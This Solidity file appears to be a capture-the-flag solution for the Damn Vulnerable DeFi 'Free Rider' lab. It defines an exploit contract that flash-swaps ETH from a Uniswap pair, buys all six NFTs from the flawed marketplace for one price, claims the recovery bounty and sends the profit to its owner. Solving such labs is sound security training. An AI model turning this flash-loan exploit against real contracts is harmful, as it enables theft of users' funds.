//SPDX-License-Identifier: MIT

pragma solidity =0.8.25;    

import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


contract FreeRiderExploiter is IERC721Receiver{
    WETH weth;

    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;
    address owner;

    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;

    constructor(
        WETH _weth, 
        IUniswapV2Pair _uniswapPair, 
        FreeRiderNFTMarketplace _marketplace, 
        DamnValuableNFT _nft, 
        FreeRiderRecoveryManager _recoveryManager
    ) payable {
        weth = _weth;
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        nft = _nft;
        recoveryManager = _recoveryManager;
        owner = msg.sender;
    }

    function pwn() public {
        uniswapPair.swap(NFT_PRICE,0, address(this), new bytes(1)); //flashswaps 15 eth from uniswap pair
        payable(owner).transfer(address(this).balance);     //transfer the eth to owner
    }   

    //when swap is called, the uniswapV2Call function is called(callback) in this address, which will:
    //1. withdraw the weth balance from this contract
    //2. buy all the NFTs from the marketplace
    //3. transfer all the NFTs to the recovery manager
    //4. deposit the required amount of weth to the uniswap pair (payback the flash loan), if not paid back, the transaction will revert.

    //flash swaps https://www.wallstreetmojo.com/flash-swap/


    function uniswapV2Call(
        address sender, 
        uint256 amount0, 
        uint256 amount1, 
        bytes calldata data
    ) external {

        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);

        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
        }

        weth.withdraw(weth.balanceOf(address(this)));
        marketplace.buyMany{value: NFT_PRICE}(ids);

        for (uint256 i = 0; i < ids.length; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encodePacked(bytes32(uint256(uint160(owner)))));
        }

        uint amountRequired = amount0 + 1 ether;
        weth.deposit{value: amountRequired}();
        assert(weth.transfer(msg.sender, amountRequired));
    }

    function onERC721Received(
        address, address, uint256 _tokenId, bytes memory _data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}

    
}